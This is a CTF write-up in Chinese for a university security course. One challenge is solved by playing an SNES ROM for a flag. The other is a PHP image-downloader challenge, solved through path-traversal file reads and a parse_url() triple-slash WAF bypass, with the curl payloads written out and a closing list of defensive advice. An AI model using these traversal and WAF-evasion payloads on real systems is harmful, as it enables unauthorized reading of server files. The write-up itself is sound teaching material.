# IDSCTF 解題 Write-Up

**作者：** ChengYu  
**日期：** 2026/05/04  
**平台：** idsctf.mis.nsysu.edu.tw (Facebook CTF)  
**課程：** 網路安全 MIS538

---

## 題目一：奪取\_菲律賓 — Do you want to play a game?

| 項目 | 內容 |
|------|------|
| 分數 | 30 分 |
| 類型 | flag |
| 類別 | MISC |
| 附件 | `extension_c4dfa41e5ae2c47c54e40aaebf057584.smc` |

### 1. 題目分析

題目給了一個 `.smc` 檔案，並提示 "Do you want to play a game?"。`.smc` 是 Super Nintendo Entertainment System (SNES / 超級任天堂) 的 ROM 檔案格式，結合「玩遊戲」的提示，推測需要用 SNES 模擬器載入並遊玩這個 ROM 來尋找 flag。

### 2. 初步檔案分析

#### 2.1 file 指令誤判

在 WSL Ubuntu 24.04 環境中執行 `file` 指令：

```bash
$ file extension_c4dfa41e5ae2c47c54e40aaebf057584.smc
extension_c4dfa41e5ae2c47c54e40aaebf057584.smc: zlib compressed data
```

**這是一個誤判。** `file` 工具判定檔案為 zlib 壓縮資料，原因是 ROM 開頭的前兩個 byte 為 `78 9C`，恰好與 zlib 的 magic number 完全相同。

#### 2.2 走錯路：嘗試 zlib 解壓

因為相信 `file` 的結果，花費大量時間嘗試各種 zlib 解壓方式：

```python
# 嘗試 1：標準 zlib 解壓 → 失敗
zlib.decompress(data)  # Error: invalid stored block lengths

# 嘗試 2：raw deflate 解壓 → 失敗
zlib.decompress(data[2:], -15)  # Error: invalid stored block lengths

# 嘗試 3：多段 zlib stream 逐塊解壓 → 全部失敗
# 從 pos=0 掃描到 pos=1000，沒有任何位置能成功解壓
```

**教訓：** `file` 指令的結果不一定可靠，特別是對二進位檔案。當 magic number 碰巧匹配時，`file` 會誤判。應該進一步用 hex dump 確認檔案真實結構。

#### 2.3 正確分析：辨識 SNES 65816 機器碼

透過 `xxd` 查看 hex dump 後，發現前幾個 byte 其實是標準的 SNES 65816 CPU 開機初始化指令序列：

```
00000000: 78 9c 00 42 9c 0c 42 9c 0b 42 ...
```

| Bytes | 指令 | 說明 |
|-------|------|------|
| `78` | `SEI` | 關閉中斷（Set Interrupt Disable） |
| `9C 00 42` | `STZ $4200` | 關閉 NMI 和搖桿自動讀取 |
| `9C 0C 42` | `STZ $420C` | 關閉 HDMA |
| `9C 0B 42` | `STZ $420B` | 關閉 DMA |
| `9C 40 21` | `STZ $2140` | 清除 APU port 0 |

這是教科書級的 SNES 啟動程式碼。`78`（SEI 指令）恰好是 zlib magic number `78 9C` 的第一個 byte，而第二個 byte `9C`（STZ 指令的 opcode）恰好也匹配，導致 `file` 誤判。

#### 2.4 確認是 Super Mario World

檢查 LoROM header（位於 offset `0x7FC0`）：

```bash
$ xxd -s 0x7FC0 -l 32 extension_*.smc
00007fc0: 5355 5045 5220 4d41 5249 4f57 4f52 4c44  SUPER MARIOWORLD
00007fd0: 2020 2020 2020 020a 0101 0100 255f daa0        ......%_..
```

ROM 標題明確為 **SUPER MARIOWORLD**，檔案大小剛好 1,048,576 bytes（1 MB = 8 Mbit），是標準 LoROM 格式的 SMW ROM。

### 3. 為什麼 strings 找不到 flag

```bash
$ strings -n 6 extension_*.smc | grep -iE "flag|nsysu|ctf"
# 無結果
```

SNES 遊戲的文字渲染不使用 ASCII。每個字元對應一個 tile（圖塊）索引，文字是「畫」在畫面上的。因此 `strings` 工具無法從 ROM 二進位中提取出遊戲內的文字內容。**必須實際用模擬器跑才看得到。**

### 4. 使用模擬器遊玩

#### 4.1 環境搭建

下載 Snes9x 1.63（官方 GitHub 版本）：

- **正確版本：** `snes9x-1.63-win32-x64.zip`（包含 `snes9x-x64.exe`）
- **錯誤版本：** `snes9x-1.63-libretro-x64.zip`（只有 `snes9x_libretro.dll`，這是 RetroArch 的 core plugin，不能單獨執行）

**走過的彎路：**
- 一開始進入 snes9x.com 舊版官網（1998 年頁面），鏡像連結全死
- 下載了 libretro 版本（只有一個 .dll，不是獨立模擬器）
- 最終從 `github.com/snes9xgit/snes9x/releases` 下載正確版本

#### 4.2 按鍵問題排查

載入 ROM 後遇到無法操作的問題，原因有二：

1. **Input Configuration 視窗開啟時，遊戲不接受鍵盤輸入**（焦點被設定視窗搶走）
2. **中文輸入法攔截 Enter 鍵**（以為要選字，不傳給遊戲）

解法：關閉設定視窗 → 切到英文輸入法 → 點選遊戲畫面確保焦點。

#### 4.3 Snes9x 預設按鍵

| SNES 按鈕 | 鍵盤鍵 |
|-----------|--------|
| 方向鍵 | ↑↓←→ |
| Start | Enter |
| B | Z |
| A | X |
| Y | A |
| X | S |
| L / R | Q / W |

Save State：`Shift + F1~F9` 存檔，`F1~F9` 讀檔。Tab 鍵為快轉。

### 5. 尋找 Flag

遊玩過程中，在某些關卡 / 畫面發現出題者修改過的文字內容，最終找到：

```
FLAG{FUN_2_PLAY}
```

**解讀：** "Fun to Play" 的 leet speak 版本，與題目 "Do you want to play a game?" 呼應。

### 6. 關鍵教訓

| 教訓 | 說明 |
|------|------|
| 不要盲信 `file` 指令 | Magic number 碰巧匹配不代表是該格式，應用 `xxd` 確認 |
| 注意副檔名的暗示 | `.smc` 本身就是 SNES ROM 格式，不必過度懷疑 |
| SNES 文字是 tile-based | `strings` 對 SNES ROM 無效，必須用模擬器看 |
| 下載工具要認準官方來源 | GitHub releases > 古老官網 > 野雞鏡像 |
| 區分 libretro core 和獨立模擬器 | 檔名含 `libretro` 的是 RetroArch plugin，不是獨立 exe |

---

## 題目二：奪取\_加拿大 — Image Downloader

| 項目 | 內容 |
|------|------|
| 分數 | 60 分 |
| 類型 | flag |
| 類別 | Web |
| 連結 | `idsctf.mis.nsysu.edu.tw:9008` |

### 1. 題目分析

題目描述：

> To get the flag, you must come over Gandalf's wall!  
> It is very easy to crack the wall if you know its sources.  
> By notsurprised

關鍵詞解讀：

| 線索 | 真正含義 |
|------|----------|
| **Image Downloader** | 網站功能是伺服器端幫你下載圖片（Server-Side Request） |
| **Gandalf's wall** | 存在 WAF（Web Application Firewall）過濾機制 |
| **know its sources** | 需要查看原始碼（View Source）來了解 WAF 過濾邏輯 |
| **come over the wall** | 繞過 WAF 過濾機制 |

### 2. 偵察階段

#### 2.1 查看前端原始碼

在 Image Downloader 頁面按 `Ctrl + U` 查看 HTML 原始碼：

```html
<div style="padding:40px">
    ●<a href="download.php?p=1.gif">Flag1</a><br>
    ●<a href="download.php?p=2.gif">Flag2</a><br>
    ●<a href="download.php?p=3.gif">Flag3</a><br>
    ●<a href="download.php?p=4.gif">Flag4</a><br>
    ●<a href="download.php?p=5.gif">Flag5</a><br>
    <!-- ●<a href="download.php?p=flag.png">True Flag?</a><br> -->
</div>
```

**關鍵發現：** 第 18 行有一個被 HTML 註解 `<!-- -->` 隱藏的連結：

```
download.php?p=flag.png → True Flag?
```

這就是題目說的 "know its sources" — 查看原始碼就能找到隱藏入口。

#### 2.2 直接存取被擋

直接訪問 `download.php?p=flag.png` 時，回傳：

```
hacker detected!!
[YOU SHALL NOT PASS 甘道夫圖片]
```

WAF 偵測到參數中包含 `flag` 關鍵字並攔截了請求。

### 3. 漏洞探測：讀取後端原始碼

#### 3.1 讀取 download.php

題目暗示「知道來源就能破解」，因此嘗試透過 LFI（Local File Inclusion）讀取後端 PHP 原始碼。

**第一次嘗試：**
```
download.php?p=download.php → FILE NOT FOUND
```

失敗原因：PHP 程式碼會在參數前加上子目錄前綴 `resource/`，所以實際查找的是 `resource/download.php`（不存在）。

**第二次嘗試（往上一層）：**
```
download.php?p=../download.php → 成功！
```

路徑變成 `resource/../download.php` = `download.php`，成功讀取到 PHP 原始碼（因為 `file_get_contents()` 讀取的是原始檔案內容，不經過 PHP 解析器執行）。

#### 3.2 download.php 原始碼分析

```php
<?php
include "waf.php";

if(!isset($_GET['p']))
    die("missing parameters");

$p = $_GET['p'];

// 路徑穿越限制：最多允許 1 個 ".."
$b = substr(strstr($p, ".."), 2);
if (strstr($b, "../"))
    die("Too many ../");

$p = "resource/".$p;  // 關鍵：固定加上 resource/ 前綴

if (!file_exists($p))
    die("file not found");

header('Content-Type: image');
echo file_get_contents($p);  // 直接輸出檔案內容
?>
```

**分析結果：**

| 發現 | 說明 |
|------|------|
| `include "waf.php"` | WAF 過濾邏輯在 `waf.php` 中 |
| `$p = "resource/".$p` | 所有檔案從 `resource/` 目錄讀取 |
| 只允許 1 個 `../` | 可以往上跳一層目錄 |
| `file_get_contents($p)` | 直接讀檔輸出，不解析 PHP（關鍵漏洞！） |

#### 3.3 讀取 waf.php 原始碼

```
download.php?p=../waf.php → 成功！
```

`waf.php` 不含 `flag` 關鍵字，不會觸發 WAF。

```php
<?php
include "you_should_not_pass.php";

# general WAF
function waf()
{
    $keywords = [
        "update",
        # danger!!!
        "flag",
    ];

    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                bad();
            if (stristr($v, $token))
                bad();
        }
    }
}

waf();
?>
```

**WAF 邏輯分析：**

1. 黑名單關鍵字：`"update"` 和 `"flag"`
2. 使用 `parse_url($_SERVER["REQUEST_URI"])` 解析 URL
3. 使用 `parse_str()` 從解析結果中提取 query 參數
4. 對每個參數的 key 和 value 做 `stristr()`（不區分大小寫）檢查
5. 命中任何黑名單關鍵字就呼叫 `bad()` 終止請求

#### 3.4 讀取 you\_should\_not\_pass.php

```
download.php?p=../you_should_not_pass.php → 成功！
```

```php
<?php
function bad()
{
    echo 'hacker detected!! </br><img src="you_should_not_pass.jpg">';
    die();
}
?>
```

只定義了 `bad()` 函數（顯示甘道夫圖 + 終止），無額外過濾邏輯。

### 4. 攻擊階段：繞過 WAF

#### 4.1 核心漏洞：parse\_url() bypass

WAF 的致命弱點在於使用 **`parse_url()`** 來解析 URL。`parse_url()` 有一個已知行為：**當 URL 路徑以 `///`（三個斜線）開頭時，`parse_url()` 會解析失敗，回傳 `false`**。

此時 `$uri['query']` 為 `null`，`parse_str(null, $query)` 產生空陣列，`foreach` 迴圈不執行任何檢查，WAF 被完全繞過。

**關鍵區別：**
- `parse_url()` 解析 `$_SERVER["REQUEST_URI"]` → 受 `///` 影響而失敗
- `$_GET['p']` 由 Apache/PHP 核心直接解析 → 不受影響，正常取得參數值

#### 4.2 嘗試過程中的錯誤

| 嘗試方法 | 結果 | 原因 |
|----------|------|------|
| URL 編碼 `fl%61g.png` | hacker detected | `$_GET` 自動解碼，WAF 看到的還是 `flag` |
| 雙重編碼 `fl%2561g.png` | file not found | 繞過 WAF 但 `file_get_contents()` 也看到 `fl%61g.png`，檔案不存在 |
| 大小寫 `Flag.png` | file not found | `stristr()` 不區分大小寫，會被擋；即使繞過，Linux 檔案系統區分大小寫 |
| 路徑穿越 `./flag.png` | hacker detected | WAF 還是看到 `flag` |
| 直接存取 `/resource/flag.png` | 404 | Apache 回傳 404，`resource/` 目錄可能沒有 DirectoryIndex 或 flag.png 不在這 |
| 瀏覽器輸入 `///` | hacker detected | 瀏覽器會自動正規化 `///` 為 `/`，抵消了繞過效果 |

**關鍵教訓：** 瀏覽器會自動正規化 URL 路徑中的多重斜線。**必須使用 curl 並加上 `--path-as-is` 參數**來保留原始路徑格式。

#### 4.3 成功繞過 WAF

使用 curl 保留三斜線路徑：

```bash
$ curl --path-as-is "http://idsctf.mis.nsysu.edu.tw:9008///download.php?p=flag.png"
file not found
```

回傳 `file not found`（不是 `hacker detected`）— **WAF 成功繞過！** 但 `resource/flag.png` 不存在。

#### 4.4 尋找真正的 flag 檔案

WAF 已被繞過，接下來枚舉可能的 flag 檔名和路徑：

```bash
# 在 resource/ 目錄中嘗試各種檔名
for f in flag.png flag.txt flag.jpg flag.gif flag flag.php; do
  curl -s --path-as-is \
    "http://idsctf.mis.nsysu.edu.tw:9008///download.php?p=$f"
done
# 全部回傳 file not found

# 往上一層目錄嘗試
for f in flag.png flag.txt flag flag.php flag.html; do
  curl -s --path-as-is \
    "http://idsctf.mis.nsysu.edu.tw:9008///download.php?p=../$f"
done
```

**結果：`../flag.php` 命中！**

```bash
$ curl -s --path-as-is \
  "http://idsctf.mis.nsysu.edu.tw:9008///download.php?p=../flag.php"
```

回傳：

```html
<img src="uccu.gif">
<h1>Too young, too simple! Sometimes naive!</h1>
<img src="you_should_not_pass.jpg">
<h2>Ha! Ha! You can not see the content of this file, because it is PHP!!!</h2>
<?php
    $flag = "FLAG{1_6yp@55_the_Fuck!ng_Gandalf'$_W4ll}";
?>
```

### 5. Flag

```
FLAG{1_6yp@55_the_Fuck!ng_Gandalf'$_W4ll}
```

**解讀（leet speak）：** "I bypass the fucking Gandalf's Wall"

| leet | 原文 |
|------|------|
| `1` | I |
| `6yp@55` | bypass |
| `Fuck!ng` | Fucking |
| `Gandalf'$` | Gandalf's |
| `W4ll` | Wall |

### 6. 完整攻擊鏈

```
┌──────────────────────────────────────────────────┐
│ Step 1: View Source (Ctrl+U)                     │
│   → 發現 HTML 註解中隱藏的連結                    │
│     download.php?p=flag.png ("True Flag?")       │
├──────────────────────────────────────────────────┤
│ Step 2: LFI 讀取 download.php 原始碼             │
│   → download.php?p=../download.php               │
│   → 知道 resource/ 前綴 + waf.php                │
├──────────────────────────────────────────────────┤
│ Step 3: LFI 讀取 waf.php 原始碼                  │
│   → download.php?p=../waf.php                    │
│   → 發現 parse_url() 解析 URL 的 WAF 邏輯        │
├──────────────────────────────────────────────────┤
│ Step 4: parse_url() bypass                       │
│   → curl --path-as-is "///download.php?p=..."    │
│   → 三斜線讓 parse_url() 失敗，WAF 被跳過        │
├──────────────────────────────────────────────────┤
│ Step 5: 枚舉 flag 檔案位置                       │
│   → ../flag.php 命中                             │
│   → file_get_contents() 讀取 PHP 原始碼          │
│   → flag 以明文出現在 $flag 變數中                │
└──────────────────────────────────────────────────┘
```

### 7. 涉及的漏洞與技術

| 技術 | 說明 |
|------|------|
| **HTML Source Code Review** | 查看前端原始碼發現被註解隱藏的連結 |
| **Local File Inclusion (LFI)** | 透過 `../` 路徑穿越讀取上層目錄的 PHP 原始碼 |
| **PHP Source Code Disclosure** | `file_get_contents()` 讀取 `.php` 檔案時不執行，直接輸出原始碼 |
| **parse\_url() bypass** | 三斜線 `///` 導致 `parse_url()` 解析失敗，WAF 檢查被跳過 |
| **WAF Evasion** | 利用 URL 解析器與 Web Server 的解析差異繞過安全檢查 |
| **Curl --path-as-is** | 防止 HTTP client 自動正規化路徑中的多重斜線 |

### 8. 完整錯誤清單與教訓

| 錯誤 | 原因 | 正確做法 |
|------|------|----------|
| 直接存取 `resource/flag.png` → 404 | Apache 不開放靜態目錄存取 | 必須透過 `download.php` 存取 |
| URL 編碼 `fl%61g.png` 被擋 | PHP 的 `$_GET` 會自動 URL decode | URL 編碼無法繞過 server-side 過濾 |
| 雙重編碼 `fl%2561g.png` → file not found | 繞過了 WAF 但檔案系統上沒有這個檔名 | 需要讓最終檔名保持正確 |
| 瀏覽器輸入 `///` 被正規化 | 瀏覽器會合併多重斜線為單斜線 | 使用 curl + `--path-as-is` |
| `php://filter/...` → FILE NOT FOUND | PHP wrapper 不被 `file_exists()` 認為是有效路徑 | 直接讀 PHP 檔案即可，`file_get_contents()` 本身就不執行 PHP |
| flag 檔案不在 `resource/` 裡 | 出題者把 `flag.php` 放在上一層 | 用 `../` 往上找 |
| 以為 flag 是 `.png` 格式 | HTML 註解裡寫 `flag.png` 是誤導 | 需要枚舉各種副檔名，`.php` 才是正確的 |

### 9. 防禦建議

對於開發者，這題暴露了以下安全問題：

1. **不要用 `parse_url()` 做安全檢查** — 它的行為在邊界案例中不可靠。應直接檢查 `$_GET` / `$_POST` 參數值。
2. **不要用黑名單過濾** — 黑名單永遠有繞過方式。應使用白名單（只允許已知合法的檔名）。
3. **不要用 `file_get_contents()` 讀取使用者可控路徑** — 會導致 LFI 漏洞。應限制可存取的檔案清單。
4. **不要把敏感資料寫在 PHP 變數中** — 即使 PHP 正常執行時不會暴露，但 LFI 攻擊可以讀取原始碼。應使用環境變數或獨立的設定檔配合適當權限。
5. **路徑穿越防護不足** — 只限制 `../` 的數量不夠，應使用 `realpath()` 確認最終路徑在允許範圍內。

---

## 環境與工具

| 工具 | 用途 |
|------|------|
| WSL Ubuntu 24.04 (x86\_64) | Linux 指令行環境 |
| `file`, `xxd`, `strings` | 檔案分析 |
| Snes9x 1.63 (Windows x64) | SNES 模擬器 |
| curl 8.5.0 | HTTP 請求（含 `--path-as-is`） |
| Chrome DevTools (Ctrl+U) | 查看 HTML 原始碼 |

---

*Write-up 完成於 2026/05/05*
